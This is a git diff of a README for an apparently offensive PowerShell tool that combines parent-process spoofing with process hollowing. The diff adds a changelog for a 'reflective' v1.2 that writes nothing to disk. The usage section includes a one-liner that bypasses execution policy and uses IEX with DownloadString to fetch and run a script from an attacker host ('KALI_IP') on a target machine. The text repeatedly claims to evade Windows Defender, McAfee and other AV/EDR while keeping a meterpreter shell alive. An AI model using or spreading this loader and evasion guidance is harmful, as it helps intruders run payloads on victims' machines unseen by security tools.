@@ -47,7 +47,7 @@ YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
 4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/PPIDxProcHollow_v1.1.ps1')`
 
 ## Disclaimer
-The usage section might make it seem like a 'fileless' approach but it **does write temporarly artifacts to disk**. I know disk is lava🔥 but writing the code this way seems to evade Window Defender/FireEye/McAfee😨
+The usage section might make it seem like a 'fileless' approach but the v1.1 script **does write temporarly artifacts to disk**. I know disk is lava🔥 so use v1.2 (reflective)
 
 ## Evading Windows Defender
 - The v1.0 script creates an alert on Windows Defender upon launching cmd.exe from meterpreter shell. However, your meterpreter shell will still be **kept alive** despite the alert.
@@ -56,8 +56,14 @@ The usage section might make it seem like a 'fileless' approach but it **does wr
     ![Alt text](WinDefSignatureUpdate.png?raw=true "Windows Defender using latest signature version")
 - The v1.1 script has been tested on McAfee too
 ![Alt text](EvadeMcAfee.png?raw=true "McAfee")
+- The v1.2 script evades more AV/EDR due to it not touching disk at all 😁
 
 ## Change Logs
+2022-12-12 -- v1.2
+   - Converted the script to reflective
+   - Disk is lava: Resolved v1.1 issue on temporarly artifacts written to disk.
+   - Evading latest Windows Defender again as of 12 Dec 2022
+   
 2022-12-10 -- v1.1
    - Integrated with PPID spoofing
    - Evading latest Windows Defender again as of 10 Dec 2022
